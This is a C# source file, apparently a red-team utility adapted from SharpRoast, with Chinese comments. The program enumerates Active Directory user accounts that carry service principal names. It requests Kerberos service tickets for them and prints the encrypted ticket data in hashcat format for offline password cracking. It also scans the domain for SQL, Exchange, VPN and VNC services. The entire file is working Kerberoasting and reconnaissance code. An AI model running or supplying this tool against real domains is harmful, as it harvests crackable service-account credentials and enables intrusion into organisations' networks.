using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.IdentityModel.Tokens;
using System.Security.Principal;
using System.Text.RegularExpressions;

namespace SPNSearcher
{
    class Program
    {
        /// <summary>
        /// 获取 SPN 的TGS-REP
        /// </summary>
        // https://github.com/GhostPack/SharpRoast/blob/master/SharpRoast/Program.cs
        public static void GetDomainSPNTicket(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null)
        {
            string domain = "DOMAIN";

            try
            {
                Console.WriteLine("    [>] Getting SPN ticket for SPN: {0}", spn);
                KerberosRequestorSecurityToken ticket = new KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());

                // 通过 GetRequest() 函数 发起 kerbero请求
                byte[] requestBytes = ticket.GetRequest();
                string ticketHexStream = BitConverter.ToString(requestBytes).Replace("-", "");

                // 通过匹配返回值，提取票据内容
                Match match = Regex.Match(ticketHexStream, @"a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)", RegexOptions.IgnoreCase);

                if (match.Success)
                {
                    // usually 23
                    byte eType = Convert.ToByte(match.Groups["EtypeLen"].ToString(), 16);

                    int cipherTextLen = Convert.ToInt32(match.Groups["CipherTextLen"].ToString(), 16) - 4;
                    string dataToEnd = match.Groups["DataToEnd"].ToString();
                    string cipherText = dataToEnd.Substring(0, cipherTextLen * 2);

                    if (match.Groups["DataToEnd"].ToString().Substring(cipherTextLen * 2, 4) != "A482")
                    {
                        Console.WriteLine(" [X] Error parsing ciphertext for the SPN {0}. Use the TicketByteHexStream to extract the hash offline with Get-KerberoastHashFromAPReq.\r\n", spn);

                        bool header = false;
                        foreach (string line in Split(ticketHexStream, 80))
                        {
                            if (!header)
                            {
                                Console.WriteLine("    [>] TicketHexStream: {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("    [>] :{0}", line);
                            }
                            header = true;
                        }
                        Console.WriteLine();
                    }
                    else
                    {
                        // output to hashcat format
                        string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", eType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));

                        bool header = false;
                        foreach (string line in Split(hash, 80))
                        {
                            if (!header)
                            {
                                Console.WriteLine("    [>] TGS-REP: {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("    [>] :{0}", line);
                            }
                            header = true;
                        }
                        Console.WriteLine();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
            }
        }
        
        // helper to wrap output strings
        public static IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { throw new ArgumentNullException("singleLineString"); }

            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        /// <summary>
        /// 获取当前目标域中所有以域用户身份起服务的 SPN
        /// </summary>
        public static void GetUserSPN(string RootDSE)
        {
            Console.WriteLine("[*] Current Domian SPN Information:");
            Console.WriteLine();

            string querySPN = @"(&(!objectClass=computer)(servicePrincipalName=*))";
            using (var gcEntry = new DirectoryEntry("GC://" + RootDSE))
            {
                DirectorySearcher mssqlSearch = new DirectorySearcher(gcEntry, querySPN);

                foreach (SearchResult sr in mssqlSearch.FindAll())
                {
                    Console.WriteLine("    [>] SamAccountName: {0}", sr.Properties["sAMAccountName"][0]);
                    Console.WriteLine("    [>] DistinguishedName: {0}", sr.Properties["distinguishedName"][0]);
                    Console.WriteLine("    [>] ServicePrincipalName: {0}", sr.Properties["servicePrincipalName"][0]);
                    GetDomainSPNTicket((String)(sr.Properties["servicePrincipalName"][0]));
                    Console.WriteLine();
                }
            }
        }

        /// <summary>
        /// 通过 SPN 扫描获取域中基于主机的 MSSQL、Exchange 等服务
        /// </summary>
        /// ADSearcherSPNTypes = "ADAM","AGPM","bo","CESREMOTE","Dfs","DNS","Exchange","FIMService","ftp","http","IMAP","ipp","iSCSITarget","kadmin","ldap","MS","sql","nfs","secshd","sip","SMTP","SoftGrid","TERMSRV","Virtual","vmrc","vnc","vpn","vssrvc","WSMAN","xmpp"
        /// <param name="RootDSE">Current forest.</param>
        public static void GetSPNInfor(string RootDSE)
        {
            Console.WriteLine("[*] Current Domian SPN Information:");

            DirectoryEntry gcEntry = new DirectoryEntry("GC://" + RootDSE);

            List<string> Supersedence = new List<string>();
            Supersedence.AddRange(new string[]
            {
                "SQL:*MSSQL*:SQL Server 数据库",
                "Exchange:*exchange*:Exchange 相关服务",
                "DNS:*DNS*:DNS 服务",
                "SQL:*MySql*:MySql 数据库",
                "Oracle:*Oracle*:Oracle 数据库",
                "postgres:*postgres*:Postgres 数据库",
                "HTTPS:*HTTPS*:HTTPS Web 服务",
                "HTTP:*HTTP*:HTTP Web 服务",
                "VPN:*VPN*:VPN 远程接入服务",
                "VNC:*VNC*:VNC 服务"
            });

            foreach (string SPNServiceFilter in Supersedence)
            {
                string[] sArray = Regex.Split(SPNServiceFilter, ":", RegexOptions.IgnoreCase);
                string ContainsInfo = sArray[0].ToString();
                string ADSearcherSPNTypes = sArray[1].ToString();
                string SPNService = sArray[2].ToString();

                using (gcEntry)
                {
                    DirectorySearcher spnSearch = new DirectorySearcher(gcEntry, "(&(objectClass=user)(servicePrincipalName=" + ADSearcherSPNTypes + "))");

                    Console.WriteLine();
                    Console.WriteLine("  [+] SPN service: " + SPNService);

                    foreach (SearchResult sr in spnSearch.FindAll())
                    {
                        var SPNs = sr.Properties["servicePrincipalName"];

                        if (SPNs.Count > 1)
                        {
                            foreach (string spn in SPNs)
                            {
                                if (spn.Contains(ContainsInfo))
                                {
                                    Console.WriteLine("    [>] SAM Account Name: {0}", sr.Properties["sAMAccountName"][0]);
                                    Console.WriteLine("    [>] " + spn);
                                    break;
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("    [>] " + SPNs[0]);
                        }
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            Domain CurrentDomain = Domain.GetCurrentDomain();
            using (var rootEntry = new DirectoryEntry("LDAP://rootDSE"))
            {
                string RootDSE = (string)rootEntry.Properties["defaultNamingContext"].Value;

                Console.WriteLine("[*] Current Domain: " + CurrentDomain);
                GetUserSPN(RootDSE);
                //GetSPNInfor(RootDSE);
            }
        }
    }
}
